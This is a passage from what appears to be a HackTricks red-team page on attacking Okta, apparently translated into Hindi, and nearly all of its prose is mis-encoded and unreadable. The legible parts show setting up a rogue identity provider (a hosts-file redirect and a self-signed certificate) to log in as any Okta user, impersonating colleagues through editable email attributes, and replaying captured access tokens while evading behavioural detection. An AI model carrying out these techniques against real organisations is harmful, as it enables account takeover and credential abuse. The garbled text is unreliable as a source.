рд╣реЛрд╕реНрдЯреНрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ `idp.google.com` рдХреЛ `127.0.0.1` рдкрд░ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
рд╣рдореЗрдВ рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд┐рд╕ рдкрд░ рд╣рдорд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рдг рд╣реЛред рдпрд╣ рд╕реНрд╡рдпрдВ-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ OpenSSL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

рдЗрд╕рдореЗрдВ рдЖрдк рд░рдЪрдирд╛рддреНрдордХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛ рдХреЗ рдЖрд╕рдкрд╛рд╕ рдХреЛрдИ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдирд╣реАрдВ рд╣реИрдВред

рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ рдмрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ Okta рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╣рдорд╛рд░рд╛ IDP рдмрдирд╛рдирд╛ рд╣реЛрддрд╛ рд╣реИред

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

рдЕрдВрдд рдореЗрдВ, рд╣рдореЗрдВ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ `Match Against` рдХреЛ `Okta Username or Email` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ `Account Link Policy` рдХреЛ `Automatic` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдо рдореМрдЬреВрджрд╛ Okta рдЦрд╛рддреЛрдВ рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХреЗрдВ:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

рд╕рдм рдХреБрдЫ рд╕рд╣реЗрдЬрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ Metadata рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

рдлрд┐рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдФрд░ `AuthRequest` рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо `Assertion Consumer Service URL` рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рд╕реЗ рд╣рдорд╛рд░реЗ рдЖрдВрддрд░рд┐рдХ SAML рд╕рд░реНрд╡рд░ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рд╣рдо рдПрдХ рдИрдореЗрд▓ рдкрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо рдХрд┐рд╕реА рднреА Okta рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдирдХреА рд╕рд╛рдЦ рдХреЛ рдЬрд╛рдиреЗ рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдЗрдП рдЗрд╕реЗ рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рджреЗрдЦреЗрдВ [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing Okta Portal with Evilgnix

[**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ Okta рдкреЛрд░реНрдЯрд▓ рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ рдлрд╝рд┐рд╢рд┐рдВрдЧ рдЕрднрд┐рдпрд╛рди рдХреИрд╕реЗ рддреИрдпрд╛рд░ рдХрд░реЗрдВред

### Colleague Impersonation Attack

Okta рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдЬреЛ **рдЧреБрдг рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЬреИрд╕реЗ рдИрдореЗрд▓ рдпрд╛ рдкрд╣рд▓рд╛ рдирд╛рдо) рд╡реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдХреЛрдИ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** ID рдХреЗ рд░реВрдк рдореЗрдВ рдЙрд╕ **рдЧреБрдг** рдкрд░ **рд╡рд┐рд╢реНрд╡рд╛рд╕** рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЙрд╕ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдореЗрдВ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА **рдирдХрд▓** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **`userName`** рдлрд╝реАрд▓реНрдб рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рд╢рд╛рдпрдж рдЗрд╕реЗ рдмрджрд▓ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗ (рдХреНрдпреЛрдВрдХрд┐ рдЖрдорддреМрд░ рдкрд░ рдЖрдк рдЙрд╕ рдлрд╝реАрд▓реНрдб рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рд╕рдХрддреЗ), рд▓реЗрдХрд┐рди рдпрджрд┐ рдпрд╣ **`primaryEmail`** рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдЗрд╕реЗ рдЕрдкрдиреЗ рд╕рд╣рдХрд░реНрдореА рдХреЗ рдИрдореЗрд▓ рдкрддреЗ рдореЗрдВ **рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЙрд╕рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдкрдХреЛ рдИрдореЗрд▓ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рдкрд░рд┐рд╡рд░реНрддрди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛)ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдирдХрд▓реАрдХрд░рдг рдЗрд╕ рдмрд╛рдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреИрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдХреЗрд╡рд▓ рд╡реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдЧрдП рдлрд╝реАрд▓реНрдб рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдбреЗрдЯ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред\
рдЗрд╕рд▓рд┐рдП, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЗрд╕ рдлрд╝реАрд▓реНрдб рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рд╣реИ:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

рдореИрдВрдиреЗ рдЕрдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рднреА рджреЗрдЦреЗ рд╣реИрдВ рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдереЗ рд▓реЗрдХрд┐рди рдЙрдирдХреЗ Okta рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рд╡рд╣ рдлрд╝реАрд▓реНрдб рдирд╣реАрдВ рдерд╛ (рдЕрдВрдд рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрд▓рдЧ-рдЕрд▓рдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ)ред

рдкреНрд░рддреНрдпреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдЖрдк рдХрд┐рд╕реА рдХреА рднреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ, рдпрд╣ рдЬрд╛рдирдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдЗрд╕реЗ рдЖрдЬрд╝рдорд╛рдПрдВ!

## рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдиреАрддрд┐рдпреЛрдВ рд╕реЗ рдмрдЪрдирд╛ <a href="#9fde" id="9fde"></a>

рдЬрдм рддрдХ рдЖрдкрдХреЛ рдЗрд╕рдХрд╛ рд╕рд╛рдордирд╛ рдирд╣реАрдВ рд╣реЛрддрд╛, рддрдм рддрдХ рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдирд╣реАрдВ рдкрддрд╛ рдЪрд▓реЗрдЧрд╛ рдХрд┐ рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдиреАрддрд┐рдпрд╛рдВ рд▓рд╛рдЧреВ рдХреА рдЧрдИ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред Okta рдХреА рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ **рд╕рдВрднрд╛рд╡рд┐рдд рддрд░реАрдХрд╛** рдпрд╣ рд╣реИ рдХрд┐ рд╕рд┐рд░реНрдл рдореБрдЦреНрдп Okta рдбреИрд╢рдмреЛрд░реНрдб рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЯрд╛рд▓реЗрдВ рдФрд░ рд╕реАрдзреЗ Okta рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░реЗрдВ (рдпреЗ рд╡реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реЛрдВрдЧреЗ рдЬреЛ рдКрдкрд░ рдХреЗ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рд▓рд╛рд▓ рдмреЙрдХреНрд╕реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЫрд┐рдкрд╛рдП рдЧрдП рд╣реИрдВ)ред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ Okta рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рд╣реИ, рддреЛ рдЖрдк рдЯреЛрдХрди рдХреЛ рдЕрдкрдиреА рд▓рдХреНрд╖реНрдп рдХрдВрдкрдиреА рдХреЗ рдореБрдЦреНрдп Okta рд▓реЙрдЧрд┐рди рдкреГрд╖реНрда рдкрд░ рд░рд┐рдкреНрд▓реЗ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд╡рд┐рд╢рд┐рд╖реНрдЯ Okta URL рдкрд░ рд░рд┐рдкреНрд▓реЗ рдХрд░реЗрдВрдЧреЗред

рдЕрдиреНрдп рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ рд╣реИрдВ:

* рд▓реЛрдХрдкреНрд░рд┐рдп рдЕрдирд╛рдореАрдХрд░рдг рдкреНрд░реЙрдХреНрд╕реА рдФрд░ VPN рд╕реЗрд╡рд╛рдУрдВ рд╕реЗ рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХреЛ рд░рд┐рдкреНрд▓реЗ рдХрд░рддреЗ рд╕рдордп рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВред
* рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХреЛ рд░рд┐рдкреНрд▓реЗ рдХрд░рддреЗ рд╕рдордп, рдЙрд╕реА рдпреВрдЬрд░-рдПрдЬреЗрдВрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреНрд▓рд╛рдЗрдВрдЯ рдиреЗ рдХрд┐рдпрд╛ рдерд╛ред
* рдПрдХ рд╣реА IP рдкрддреЗ рд╕реЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХреЛ рд░рд┐рдкреНрд▓реЗ рдХрд░рддреЗ рд╕рдордп рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВред
* Okta рдбреИрд╢рдмреЛрд░реНрдб рдХреЗ рдЦрд┐рд▓рд╛рдл рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХреЛ рд░рд┐рдкреНрд▓реЗ рдХрд░рддреЗ рд╕рдордп рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВред
* рдпрджрд┐ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдХрд┐рди рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЗ IP рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ, рддреЛ рдЙрд╕ IP рдпрд╛ IP рд░реЗрдВрдЬ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдЕрдиреНрдп рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред

## Okta Hardening

Okta рдореЗрдВ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реИрдВ, рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рдпрдерд╛рд╕рдВрднрд╡ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдирдХреА рд╕рдореАрдХреНрд╖рд╛ рдХреИрд╕реЗ рдХрд░реЗрдВ, рдпрд╣ рдорд┐рд▓реЗрдЧрд╛:

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **HackTricks** рдХреЗ рд▓рд┐рдП PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХ
